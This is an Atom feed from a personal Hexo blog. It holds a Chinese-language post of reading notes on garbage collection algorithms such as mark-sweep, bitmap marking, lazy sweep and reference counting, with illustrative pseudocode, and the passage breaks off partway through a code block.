<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://fa1lr4in.github.io/atom.xml" rel="self"/>
  
  <link href="https://fa1lr4in.github.io/"/>
  <updated>2021-12-09T02:27:33.822Z</updated>
  <id>https://fa1lr4in.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>垃圾回收算法与实现</title>
    <link href="https://fa1lr4in.github.io/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <id>https://fa1lr4in.github.io/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/</id>
    <published>2021-12-09T02:26:54.000Z</published>
    <updated>2021-12-09T02:27:33.822Z</updated>
    
    <content type="html"><![CDATA[<h1 id="垃圾回收的算法与实现"><a href="#垃圾回收的算法与实现" class="headerlink" title="垃圾回收的算法与实现"></a>垃圾回收的算法与实现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章与其说是blog，不如说是reading notes。里面大部分内容都参考自《垃圾回收的算法与实现》。另一部分则是笔者对v8的官方blog和源码进行分析得出。作者的文字内容逻辑清晰，通俗易懂，笔者受益匪浅，相信每个人阅读此书都有种醍醐灌顶的感觉。笔者仅仅是将书中的内容理解并归纳，方便日后应用可以找到理论依据，也是将自己的学习历程记录下来。我会用尽量精炼且逻辑清晰的语言描述一些概念，而不是用长篇累牍的描述与书中相同的东西，那毫无意义，这样做的目的是为了自己在多年后看到这篇文章仍然可以快速回忆起里面的内容，也希望可以帮助大家快速的掌握GC相关的知识。</p><p>here we go！</p><h2 id="算法篇"><a href="#算法篇" class="headerlink" title="算法篇"></a>算法篇</h2><h3 id="一些定义"><a href="#一些定义" class="headerlink" title="一些定义"></a>一些定义</h3><p><code>对象</code>：对象是 GC 的基本单位；对象由<code>头（header）</code>和<code>域（field）</code>构成，<code>头（header）</code>描述了对象的特征并可能设有一些flag数据结构，而<code>域（field）</code>则表示对象的数据部分。</p><p><code>mutator</code>：相当于进程，在运行的过程中会对内存进行操作，可以产生或销毁对象，也是GC的目标。</p><p><code>堆</code>：GC的主要目标，对象的分配和GC都在这里进行。$heap_start +  HEAP_SIZE == $heap_end</p><p><code>活动对象/非活动对象</code>：能通过 mutator 引用的对象称为“活动对象”。不能通过mutator 引用的对象称为“非活动对象”。</p><p><code>chunk</code>：对象所占用的那块空间。</p><p><code>根（root）</code>：是指向对象的指针的“起点”部分。寄存器、调用栈、全局变量空间这些都是根，因为他们可以指向活动对象。</p><p><code>【评价标准】吞吐量</code>：处理同样大小的堆需要的时间，时间越小吞吐量越大。</p><p><code>【评价标准】最大暂停时间</code>：GC会使 mutator 暂停执行，所有次GC中时间消耗最久的即为最大暂停时间，该指标影响了人机交互体验。</p><p><code>【评价标准】堆使用效率</code>：可以解释为完成同样的任务占用的堆空间越多，堆使用效率越低。</p><p><code>【评价标准】是否利用缓存优势</code>：具有引用关系的对象在堆中如果相距比较近，则可以提高在缓存中读取到想利用的数据的概率，令 mutator 高速运行。这叫做利用了缓存优势。</p><p><code>三大经典算法</code>：分别指GC标记-清除算法（Mark Sweep GC），引用计数法（Reference Counting），GC复制算法（Copying GC）。其他众多GC算法都是从这三种算法衍生出来的。</p><h3 id="GC标记-清除算法（Mark-Sweep-GC）"><a href="#GC标记-清除算法（Mark-Sweep-GC）" class="headerlink" title="GC标记 -清除算法（Mark Sweep GC）"></a>GC标记 -清除算法（Mark Sweep GC）</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>GC 标记 - 清除算法由标记阶段和清除阶段构成。标记阶段会将所有活动对象都做上标记。而清除阶段会将没有标记的对象（即非活动对象）进行内存回收。（John McCarthy 1960年发布）</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mark_sweep：标记-清除算法，分为标记阶段和清除阶段</span></span><br><span class="line"><span class="built_in">mark_sweep</span>()&#123;</span><br><span class="line"> <span class="built_in">mark_phase</span>()</span><br><span class="line"> <span class="built_in">sweep_phase</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mark_phase：标记阶段遍历根为活动对象打上标记。</span></span><br><span class="line"><span class="built_in">mark_phase</span>()&#123;</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> <span class="built_in">mark</span>(*r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mark：对未打上标记的活动对象打上标记，并递归处理子对象。搜索方式属于深搜。</span></span><br><span class="line"><span class="built_in">mark</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.mark == FALSE)</span><br><span class="line"> obj.mark = TRUE</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> <span class="built_in">mark</span>(*child)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sweep_phase：清除阶段从堆首遍历到堆尾，将已标记对象置为未标记，将未标记对象释放并链接入空闲链表。</span></span><br><span class="line"><span class="comment">// 标记阶段和清除阶段有一个较大的区别就是标记阶段是从根开始遍历活动对象，而清除阶段是遍历整个堆。所以清除阶段花费的时间要久一点。</span></span><br><span class="line"><span class="built_in">sweep_phase</span>()&#123;</span><br><span class="line">sweeping = $heap_start</span><br><span class="line"> <span class="keyword">while</span>(sweeping &lt; $heap_end) &#123;</span><br><span class="line">     <span class="keyword">if</span>(sweeping.mark == TRUE)</span><br><span class="line">      sweeping.mark = FALSE</span><br><span class="line">     <span class="keyword">else</span> &#123;</span><br><span class="line">         sweeping.field_0 = $free_list<span class="comment">// 我们知道对象有头和域，这里将对象域的第一部分（即field_0）设置为之前空闲链表的第一个元素。</span></span><br><span class="line">         $free_list = sweeping<span class="comment">//此时该对象成为了空闲链表的第一个元素，由于该对象的field_0存放了下一块空闲空间，这样依次就可以把所有空闲的空间都串在一起。</span></span><br><span class="line">         sweeping += sweeping.size</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// new_obj：遍历空闲链表，从中取出合适大小的chunk并返回，如果选中的chunk比较大则对其进行切割。</span></span><br><span class="line"><span class="built_in">new_obj</span>(size)&#123;</span><br><span class="line"> chunk = <span class="built_in">pickup_chunk</span>(size, $free_list)</span><br><span class="line"> <span class="keyword">if</span>(chunk != <span class="literal">NULL</span>)</span><br><span class="line"> <span class="keyword">return</span> chunk</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 上面的分配策略叫作 First - fit。发现大于等于size 的chunk时就会立即返回该chunk。</span></span><br><span class="line"><span class="comment">// 第二种策略是遍历空闲链表，返回大于等于 size 的最小chunk，这种策略叫作 Best - fit。</span></span><br><span class="line"><span class="comment">// 最后一种策略叫作 Worst - fit，即找出空闲链表中最大的chunk，将其分割成 mutator 申请的大小和分割后剩余的大小，目的是将分割后剩余的chunk最大化。但因为 Worst - fit 很容易生成大量小的chunk，所以不推荐。</span></span><br></pre></td></tr></table></figure><h4 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h4><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><ol><li><code>实现简单</code>：算法简单，实现容易，与其他算法的组合也简单。</li></ol><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><ol><li><code>碎片化</code>：空闲链表里面的chunk地址空间一般是不连续的，造成了比较多的内存碎片。这样当分配大对象时即使空闲空间的总大小&gt;=大对象的大小也无法给大对象分配空间。</li><li><code>分配速度较慢</code>：GC 标记 - 清除算法使用了空闲链表的数据结构，这样在分配时需要遍历空闲链表来进行chunk的分配。而GC复制算法和GC标记-压缩等搜索型算法则不需要，它们的空闲空间是连续成块的，需要时将其切割即可。</li><li><code>与写时复制技术不兼容</code>：Linux在Fork进程时有“读时共享，写时复制”的机制。而在GC标记-清除算法的标记阶段会对每个对象进行进行标记，这样相当于对头进行了数据的写入，造成了无谓的内存复制。</li></ol><p>实际上缺点1和2都是空闲链表这个数据结构的问题，缺点三则是标记flag设置的问题。</p><h4 id="优化措施"><a href="#优化措施" class="headerlink" title="优化措施"></a>优化措施</h4><h5 id="多个空闲链表（multiple-free-list）"><a href="#多个空闲链表（multiple-free-list）" class="headerlink" title="多个空闲链表（multiple free-list）"></a>多个空闲链表（multiple free-list）</h5><p>总体来说就是将之前的单个空闲链表变为多个空闲链表，每个空闲链表装固定大小的空闲chunk，解决的是<code>分配速度较慢</code>的问题。</p><p>一般mutator 很少会申请非常大的chunk。为了应对这种极少出现的情况而大量制造空闲链表，我们给chunk大小设定一个上限，chunk如果大于等于这个大小就全部采用一个空闲链表处理。举个例子——如果设定chunk大小上限为 100 个字，那么准备用于 2个字、3 个字、……、100 个字，以及大于等于 101 个字的总共 100 个空闲链表就可以了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// new_obj：分配对象的阶段，根据要分配对象的大小从对应的空闲链表中去取。</span></span><br><span class="line"><span class="built_in">new_obj</span>(size)&#123;</span><br><span class="line"> index = size / (WORD_LENGTH / BYTE_LENGTH)</span><br><span class="line"> <span class="keyword">if</span>(index &lt;= <span class="number">100</span>)</span><br><span class="line"> <span class="keyword">if</span>($free_list[index] != <span class="literal">NULL</span>)</span><br><span class="line"> chunk = $free_list[index]</span><br><span class="line"> $free_list[index] = $free_list[index].next</span><br><span class="line"> <span class="keyword">return</span> chunk</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> chunk = <span class="built_in">pickup_chunk</span>(size, $free_list[<span class="number">101</span>])</span><br><span class="line"> <span class="keyword">if</span>(chunk != <span class="literal">NULL</span>)</span><br><span class="line"> <span class="keyword">return</span> chunk</span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sweep_phase 清除阶段，清除时依据清除对象的大小放入对应的空闲链表中。</span></span><br><span class="line"><span class="built_in">sweep_phase</span>()&#123;</span><br><span class="line"> <span class="keyword">for</span>(i : <span class="number">2.</span><span class="number">.101</span>)</span><br><span class="line"> $free_list[i] = <span class="literal">NULL</span></span><br><span class="line"> sweeping = $heap_start</span><br><span class="line"> <span class="keyword">while</span>(sweeping &lt; $heap_end)</span><br><span class="line"> <span class="keyword">if</span>(sweeping.mark == TRUE)</span><br><span class="line"> sweeping.mark = FALSE</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> index = size / (WORD_LENGTH / BYTE_LENGTH )</span><br><span class="line"> <span class="keyword">if</span>(index &lt;= <span class="number">100</span>)</span><br><span class="line"> sweeping.next = $free_list[index]</span><br><span class="line"> $free_list[index] = sweeping</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> sweeping.next = $free_list[<span class="number">101</span>]</span><br><span class="line"> $free_list[<span class="number">101</span>] = sweeping</span><br><span class="line"> sweeping += sweeping.size</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="BIBOP法（Big-Bag-Of-Pages）"><a href="#BIBOP法（Big-Bag-Of-Pages）" class="headerlink" title="BIBOP法（Big Bag Of Pages）"></a>BIBOP法（Big Bag Of Pages）</h5><p>将堆切成若干块，每块堆空间里面存放的对象大小相同。下图第一部分和第三部分存放的都是三个字大小的对象，而第二部分存放的都是两个字大小的对象。但是有个问题，它不能完全消除碎片化——比方说在第一部分就有空闲chunk，而第二部分还是有活动对象，这样就产生了碎片化，不过可以一定程度上缓解之前的无序状态。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210916162407395.png" alt="BIBOP"></p><h5 id="位图标记法（bitmap-mark）"><a href="#位图标记法（bitmap-mark）" class="headerlink" title="位图标记法（bitmap mark）"></a>位图标记法（bitmap mark）</h5><p>经典的GC标记-清除算法通过在对象的头中设置flag位来实现标记状态的判定，上面也已经提到了这<code>与写时复制技术不兼容</code>，所以我们可以维护一个表格来管理所有对象的标记状态。这个表格就叫做 “位图表格” 。利用这个位图表格进行标记的行为称为 “位图标记”。</p><p>【优点】与写时复制技术兼容：比较好理解，这种方式标记修改的只是位图表格，并没有修改对象。</p><p>【优点】清除操作更高效：由于维护了位图表格，清除阶段取消标志位的过程直接通过遍历位图表格取消置位即可。</p><p>【注意】当堆不同时，offest也不同，这时就需要不同的位图表格来服务每一个堆。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mark：标记阶段，没什么好说的，只是之前标记了对象头，现在标记在位图表格中了。</span></span><br><span class="line"><span class="comment">// 如何通过位图表格元素索引找到对应对象呢？这里维护了bitmap_tbl[index]和offset的对应关系，这里的索引从低到高与堆地址空间从低到高是对应的。</span></span><br><span class="line"><span class="built_in">mark</span>(obj)&#123;</span><br><span class="line"> obj_num = (obj - $heap_start) / WORD_LENGTH</span><br><span class="line"> index = obj_num / WORD_LENGTH</span><br><span class="line"> offset = obj_num % WORD_LENGTH</span><br><span class="line"> <span class="keyword">if</span>(($bitmap_tbl[index] &amp; (<span class="number">1</span> &lt;&lt; offset)) == <span class="number">0</span>)</span><br><span class="line"> $bitmap_tbl[index] |= (<span class="number">1</span> &lt;&lt; offset)</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> <span class="built_in">mark</span>(*child)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sweep_phase：清除阶段同样是遍历堆，但是这里在位图表格中判断对象未被标记时放进空闲链表，如果已被标记则不管。在最后遍历位图表格统一将所有元素都置为未标记 。</span></span><br><span class="line"><span class="built_in">sweep_phase</span>()&#123;</span><br><span class="line"> sweeping = $heap_start</span><br><span class="line"> index = <span class="number">0</span></span><br><span class="line"> offset = <span class="number">0</span></span><br><span class="line"> <span class="keyword">while</span>(sweeping &lt; $heap_end)</span><br><span class="line"> <span class="keyword">if</span>($bitmap_tbl[index] &amp; (<span class="number">1</span> &lt;&lt; offset) == <span class="number">0</span>)</span><br><span class="line"> sweeping.next = $free_list</span><br><span class="line"> $free_list = sweeping</span><br><span class="line"> index += (offset + sweeping.size) / WORD_LENGTH</span><br><span class="line"> offset = (offset + sweeping.size) % WORD_LENGTH</span><br><span class="line"> sweeping += sweeping.size</span><br><span class="line">     </span><br><span class="line"> <span class="keyword">for</span>(i : <span class="number">0.</span>.(HEAP_SIZE / WORD_LENGTH - <span class="number">1</span>))</span><br><span class="line"> $bitmap_tbl[i] = <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="延迟清除法（Lazy-Sweep）"><a href="#延迟清除法（Lazy-Sweep）" class="headerlink" title="延迟清除法（Lazy Sweep）"></a>延迟清除法（Lazy Sweep）</h5><p>延迟清除法是缩减因清除操作而导致的 mutator 最大暂停时间的方法。在标记操作结束后，不进行清除操作，而是如其字面意思一样让它“延迟”，通过“延迟”来防止 mutator 长时间暂停。它没有空闲链表这个数据结构。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// new_obj：这里先使用快速方式从堆的中间部分往下寻找空闲对象，如果找不到。执行完整的GC标记-清除算法，如果仍然找不到则代表堆中没有适合大小的空闲块（因为这里没有空闲链表的数据结构）。这样确保整个堆已经被完整的遍历一遍了。说白了第一次lazy_sweep是快速搜索，第二次lazy_sweep是全量搜索。</span></span><br><span class="line"><span class="built_in">new_obj</span>(size)&#123;</span><br><span class="line"> chunk = <span class="built_in">lazy_sweep</span>(size)<span class="comment">// 第一遍处理，从中间向后进行处理，快速处理。</span></span><br><span class="line"> <span class="keyword">if</span>(chunk != <span class="literal">NULL</span>)</span><br><span class="line"> <span class="keyword">return</span> chunk</span><br><span class="line"> <span class="built_in">mark_phase</span>()</span><br><span class="line"> chunk = <span class="built_in">lazy_sweep</span>(size)<span class="comment">// 第二遍处理是执行完标记再进行的处理，从堆起始位置开始处理，是完整处理。</span></span><br><span class="line"> <span class="keyword">if</span>(chunk != <span class="literal">NULL</span>)</span><br><span class="line"> <span class="keyword">return</span> chunk</span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// lazy_sweep： 清除阶段从sweeping位置开始向堆尾遍历，找到合适大小的空闲chunk就返回作为新对象的chunk。找到的如果是活动对象则将其取消标记。</span></span><br><span class="line"><span class="built_in">lazy_sweep</span>(size)&#123;</span><br><span class="line"> <span class="keyword">while</span>($sweeping &lt; $heap_end)</span><br><span class="line"> <span class="keyword">if</span>($sweeping.mark == TRUE)</span><br><span class="line"> $sweeping.mark = FALSE</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span>($sweeping.size &gt;= size)</span><br><span class="line"> chunk = $sweeping</span><br><span class="line"> $sweeping += $sweeping.size</span><br><span class="line"> <span class="keyword">return</span> chunk</span><br><span class="line">$sweeping += $sweeping.size</span><br><span class="line">     </span><br><span class="line"> $sweeping = $heap_start</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种情况下可以减少最大暂停时间，但不是绝对。</p><p>如果某次标记阶段结束后的堆如下——当$sweeping在空闲对象周围时可以马上获得chunk，此时可以减少 mutator 的暂停时间。而一旦$sweeping在活动对象周围时则将长时间获取不到空闲chunk，之后第二次进行了完整的标记-清除的过程反而使 mutator 的暂停时间增加。</p><p>最大暂停时间较长的问题可以通过增量式垃圾回收方式解决（三色标记法）。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210916171310071.png" alt="image-20210916171310071"></p><h3 id="引用计数法（Reference-Counting）"><a href="#引用计数法（Reference-Counting）" class="headerlink" title="引用计数法（Reference Counting）"></a>引用计数法（Reference Counting）</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>引用计数法中引入了“计数器”的概念，也就是有多少程序引用了这个对象（被引用数）。（George E. Collins 1960年发布，Harold McBeth 1963解决了循环引用的问题）</p><h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h4><h5 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// new_obj：当新创建一个对象时，计数器由0增加到1。</span></span><br><span class="line"><span class="built_in">new_obj</span>(size)&#123;</span><br><span class="line"> obj = <span class="built_in">pickup_chunk</span>(size, $free_list)</span><br><span class="line"> <span class="keyword">if</span>(obj == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> obj.ref_cnt = <span class="number">1</span></span><br><span class="line"> <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="更新引用计数"><a href="#更新引用计数" class="headerlink" title="更新引用计数"></a>更新引用计数</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// update_ptr：两步操作，一是进行计数器的增减，二是更新指针指向的对象。这里需要注意的就是需要先加后减，原因是为了处理 *ptr 和 obj 是同一对象时的情况，当先减后加时，obj的引用计数可能变为0被释放了，此时再进行加就找不到对象了（因为已经被回收了）。</span></span><br><span class="line"><span class="built_in">update_ptr</span>(ptr, obj)&#123;</span><br><span class="line"> <span class="built_in">inc_ref_cnt</span>(obj)</span><br><span class="line"> <span class="built_in">dec_ref_cnt</span>(*ptr)</span><br><span class="line"> *ptr = obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// inc_ref_cnt：简单将计数器数值加一。</span></span><br><span class="line"><span class="built_in">inc_ref_cnt</span>(obj)&#123;</span><br><span class="line"> obj.ref_cnt++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dec_ref_cnt：首先将计数器数值减一，如果该对象计数器数值变为0，则递归调用dec_ref_cnt函数处理该对象的子对象。之后释放该对象。</span></span><br><span class="line"><span class="built_in">dec_ref_cnt</span>(obj)&#123;</span><br><span class="line"> obj.ref_cnt--</span><br><span class="line"> <span class="keyword">if</span>(obj.ref_cnt == <span class="number">0</span>)</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> <span class="built_in">dec_ref_cnt</span>(*child)</span><br><span class="line"> <span class="built_in">reclaim</span>(obj)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用计数法有两个特点</p><ol><li>引用计数法的垃圾回收是实时的。</li><li>可以说将内存管理和mutator同时运行。</li></ol><h4 id="评估-1"><a href="#评估-1" class="headerlink" title="评估"></a>评估</h4><h5 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h5><ol><li><code>立即回收垃圾</code>：垃圾可以实时的被回收掉，并将chunk链接到空闲链表中供对象申请</li><li><code>最大暂停时间短</code>：其他GC方式都有一个专门的GC阶段，而引用计数法的GC和mutator是同时运行的。</li><li><code>没必要沿指针查找</code>：这个是引用计数法的特点，不同于搜索型算法，引用计数法没有遍历内存的过程。</li></ol><h5 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h5><ol><li><code>计数器值的增减处理繁重</code>：大多数情况下指针会频繁地更新。特别是有根的指针，这是因为根可以通过 mutator 直接被引用。</li><li><code>计数器需要占用很多位</code>：用于引用计数的计数器最大必须能数完堆中所有对象的引用数。假如我们用的是 32 位机器，那么就有可能要让 2 的 32 次方个对象同时引用一个对象。使堆使用效率降低了。</li><li><code>实现烦琐复杂</code>：引用计数的算法本身很简单，但事实上需要在每一处修改指针的代码出都加上增减计数器的逻辑。因为修改指针会发生的非常频繁，所以重写过程中很容易出现遗漏。引发bug或安全漏洞。</li><li><code>循环引用无法回收</code>：当两个对象互相引用时，各对象的计数器的值均为1。但是这些对象组并没有被其他任何对象引用。因此想一并回收这两个对象都不行。</li></ol><p>虽然引用计数法有很多缺点，但是引用计数法只要稍加改良，就会变得非常具有实用性了。</p><h4 id="优化措施-1"><a href="#优化措施-1" class="headerlink" title="优化措施"></a>优化措施</h4><h5 id="延迟引用计数法（Deferred-Reference-Counting）"><a href="#延迟引用计数法（Deferred-Reference-Counting）" class="headerlink" title="延迟引用计数法（Deferred Reference Counting）"></a>延迟引用计数法（Deferred Reference Counting）</h5><p>该方式解决的是<code>计数器值的增减处理繁重</code>的问题。根的引用变化频繁是导致计数器增减处理繁重的重要原因之一。因此可以让根引用的指针变化不反映在计数器上。但可能发生对象仍在活动，但却被错当成垃圾回收的情况。于是，我们可以在延迟引用计数法中使用 ZCT（Zero Count Table）。ZCT 是一个表，它会记录计数器值在 dec_ref_cnt函数的作用下变为 0 的对象。由于计数器值为 0 的对象不一定都是垃圾，所以暂时先将这些对象保留。当ZST表爆满之后对ZST表进行处理来回收真正的垃圾。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918120635560.png" alt="image-20210918120635560"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dec_ref_cnt：减计数器函数。当对象的计数器被减为0时将其放入ZST表中，如果ZST表爆满则调用scan_zct清理ZST表，让活动对象离开，回收垃圾。</span></span><br><span class="line"><span class="built_in">dec_ref_cnt</span>(obj)&#123;</span><br><span class="line"> obj.ref_cnt--</span><br><span class="line"> <span class="keyword">if</span>(obj.ref_cnt == <span class="number">0</span>)</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">is_full</span>($zct) == TRUE)</span><br><span class="line"> <span class="built_in">scan_zct</span>()</span><br><span class="line"> <span class="built_in">push</span>($zct, obj)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// new_obj：分配对象的chunk。会进行两次chunk的分配，第一次试图常规分配。如果不成功则清空ZST进行第二次chunk分配。</span></span><br><span class="line"><span class="built_in">new_obj</span>(size)&#123;</span><br><span class="line"> obj = <span class="built_in">pickup_chunk</span>(size, $free_list)<span class="comment">// 第一次chunk分配</span></span><br><span class="line"> <span class="keyword">if</span>(obj == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="built_in">scan_zct</span>()</span><br><span class="line"> obj = <span class="built_in">pickup_chunk</span>(size, $free_list)<span class="comment">// 清空ZST后进行第二次chunk分配</span></span><br><span 